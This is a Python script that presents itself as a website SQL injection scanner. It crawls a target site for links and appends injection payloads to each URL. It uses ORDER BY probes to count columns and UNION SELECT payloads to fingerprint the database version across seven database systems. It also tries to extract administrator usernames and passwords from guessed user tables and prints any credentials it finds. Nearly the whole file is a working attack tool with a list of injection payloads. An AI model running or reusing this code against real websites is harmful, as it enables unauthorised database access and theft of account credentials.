import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random, re
from urllib.parse import urlparse
from requests.exceptions import SSLError, ConnectionError

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

def get_response(url, retries=3):
    """
    Sends an HTTP GET request to the specified URL, with retries in case of failure.

    Args:
        url (str): The URL to send the request to.
        retries (int): The number of times to retry the request in case of failure. Default is 3.

    Returns:
        Response object if the request is successful (status code 200).
        Returns None if the maximum number of retries is reached without success.
    
    Raises:
        Prints a message if the request results in an error (e.g., ConnectionError, SSLError).
    """
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] Congratulations, your website is secure: access to {url} was blocked with a 403 (Forbidden) code.")
                return r
        except (requests.RequestException, SSLError, ConnectionError) as e:
            print(f"[-] Connection error to {url}: {e}")
            time.sleep(random.uniform(1, 3))
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None

# try to get paths with get parameter
def find_urls_to_test(url, base_url):
    """
    Attempts to discover URLs with GET parameters from the given page.

    Args:
        url (str): The URL of the page to be analyzed.
        base_url (str): The base URL used to build full URLs from relative links.

    Returns:
        set: A set of discovered URLs containing query parameters or potential targets.

    Description:
        - Retrieves the content of the page specified by `url`.
        - Parses the HTML and looks for `<a>` tags to extract links.
        - Builds full URLs from relative links based on the base URL.
        - Filters out links that don't match the base URL's domain.
        - Additionally searches through `<script>` content if no parameterized URLs are found.
        - Returns a set of URLs to test for vulnerabilities.
    """
    
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)

    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
              links.add(full_url)
            elif href.startswith('/'):
               links.add(full_url)
        
        #links.add(full_url)
      
    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs")
    
    return links

def exploit_database_version(url):
    # Definimos tipos de base de datos y payloads adicionales para incrementar persistencia
    database_types = {
        'Oracle': [
            "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
            "' AND 1=2 UNION SELECT NULL, version FROM v$instance--"
        ],
        'MySQL': [
            " UNION SELECT @@version, NULL%23",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'PostgreSQL': [
            "' UNION SELECT version(), NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ],
        'Microsoft SQL Server': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'SQLite': [
            "' UNION SELECT sqlite_version(), NULL--",
            "' AND 1=2 UNION SELECT sqlite_version(), NULL--"
        ],
        'DB2': [
            "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
            "' AND 1=2 UNION SELECT version(), NULL FROM sysibm.sysversions--"
        ],
        'Sybase': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ]
    }

    try:
        for db_type, payloads in database_types.items():
            #print(f"[*] Attempting to detect {db_type} database...")
            
            for payload in payloads:
                try:
                    response = requests.get(f"{url}{payload}")
                    response.raise_for_status()
                except requests.exceptions.HTTPError as e:
                    status_code = e.response.status_code

                    if status_code == 403:
                        print(f"[+] Congratulations, your website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
                        continue
                    elif status_code == 500:
                        print(f"[+] Potential vulnerability found with payload: {payload}")
                        continue
                    else:
                        #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
                        continue

                if re.search(db_type, response.text, re.IGNORECASE):
                    soup = BeautifulSoup(response.text, 'html.parser')

                    if db_type == 'Oracle':
                        version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
                        if version_oracle:
                            print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
                            return
                    elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
                        version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
                        if version_generic:
                            version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
                            if version_number:
                                print(f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
                                return
                    elif db_type == 'PostgreSQL':
                        version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
                        if version_postgres:
                            print(f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
                            return
                    elif db_type == 'SQLite':
                        version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
                        if version_sqlite:
                            print(f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
                            return
                    elif db_type == 'DB2':
                        version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
                        if version_db2:
                            print(f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
                            return

                    print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
            
                else:
                    print(f"[-] No match found for {db_type} using current payload.")
                
                # Añadir un delay para no sobrecargar el servidor
                time.sleep(1)

        print("[-] Could not detect the database type after exhausting all payloads.")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while trying to detect the database version: {e}")


def exploit_sqli_users_table(url):
    """
    Performs SQL injection to attempt to retrieve the administrator's password from the users table.

    Args:
        url (str): The URL to target for SQL injection.

    Returns:
        bool: True if the administrator's password is found, False otherwise.

    Description:
        - Constructs a SQL injection payload to extract the 'username' and 'password' from the 'users' table.
        - Sends a request with the SQL payload appended to the URL.
        - If the response is in HTML format, it parses the content for common usernames.
        - If a username is found, it retrieves the associated password and prints it.
        - Returns True if the password is successfully found, otherwise returns False.
        - Handles SSL errors and other request-related exceptions.
    """
    
    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
    possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']

    def try_payload(sql_payload):
        """
        Internal helper function to test a SQL payload across all possible tables.
        Returns True if a password is found, otherwise False.
        """

        for table in possible_tables:
            payload_to_try = sql_payload.format(table=table)
            #print(f"[DEBUG] Trying payload: {payload_to_try}")
            try:
                r = requests.get(url + payload_to_try, verify=False, proxies=proxies, timeout=10)
            except SSLError as e:
                print(f"[-] SSL Error en {url}: {e}")
                continue

            if "text/html" in r.headers.get("Content-Type", ""):
                soup = BeautifulSoup(r.text, 'html.parser')
            else:
                #print(f"[-] La respuesta no es de tipo HTML con el payload: {payload_to_try}")
                continue

            if not soup.body:
                #print(f"[-] No se encontró un cuerpo HTML válido con el payload: {payload_to_try}")
                continue

            for username in common_usernames:
                user_element = soup.body.find(string=username)
                if user_element:
                    parent = user_element.parent
                    password_element = parent.findNext('td') if parent else None

                    if password_element and password_element.contents:
                        admin_password = password_element.contents[0]
                        print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                        return True
                    
            admin_element = soup.find(string=re.compile(r'.*administrator.*'))
            if admin_element:
                try:
                    admin_password = admin_element.split('*')[1]
                    print(f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                    return True
                except IndexError:
                    print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")

            #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}' con el payload '{payload_to_try}'")

        return False

    first_payload = "' UNION select username, password from {table}--"
    if try_payload(first_payload):
        return True

    second_payload = "' UNION select NULL, username || '*' || password from {table}--"
    if try_payload(second_payload):
        return True

    print(f"[-] No se pudieron extraer las credenciales del administrador")
    return False

def exploit_sqli(url):
    """
    Attempts to perform SQL injection on the target URL using a list of common payloads.

    Args:
        url (str): The target URL for the SQL injection test.

    Returns:
        bool: True if a vulnerable URL is found, False otherwise.

    Description:
        - Iterates through a list of common SQL injection payloads.
        - Appends each payload to the target URL and sends an HTTP request.
        - If the response contains an "Internal Server Error", the URL is likely vulnerable.
        - Handles SSL and request-related errors.
        - Returns True if a vulnerable URL is identified, otherwise returns False.
    """
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "' UNION SELECT NULL, NULL --"
    ]

    for payload in payloads:
        target_url = url + payload
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if "Internal Server Error" in r.text:
                print(f"[+] Vulnerable URL found with payload {payload}")
                return True
        except SSLError as e:
            print(f"[-] SSL Error en {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error en {target_url}: {e}")
            return False

    return False

def exploit_sqli_column_number(url):
    """
    Attempts to detect the number of columns in the database using SQL injection.

    Args:
        url (str): The target URL for testing column numbers in SQL injection.

    Returns:
        int or bool: The number of columns if detected, or False in case of an error.

    Description:
        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
        - Sends an HTTP request to test the response for each column count.
        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
        - Handles SSL and request-related exceptions.
        - Returns the number of columns or False if an error occurs or if no column number is determined.
    """
    for i in range(1, 10):
        target_url = url + "'+order+by+%s--" % i
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if "Internal Server Error" in r.text:
                return i - 1 
        except SSLError as e:
            print(f"[-] SSL Error en {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error en {target_url}: {e}")
            return False
    return False

if __name__ == "__main__":
    
    base_url = input("Enter the URL you want to scan: ").strip()
    base_url = base_url.rstrip('/')

    print("[+] Inspecting the different paths for the entered page...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    if urls_to_test:
        # print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            
            # Test for general SQL injection vulnerabilities
            is_vulnerable = exploit_sqli(test_url)
             
            if not is_vulnerable:
                num_col = exploit_sqli_column_number(test_url)
                if num_col:
                    #print(f"[+] Vulnerable URL found: {test_url}")
                    print(f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                else:
                    print("[-] URL not vulnerable to sql injection")
            
            # After testing general vulnerabilities, test for user table credentials
            exploit_sqli_users_table(test_url)
            exploit_database_version(test_url)
            
    else:
        print("[-] No URLs with parameters found.")
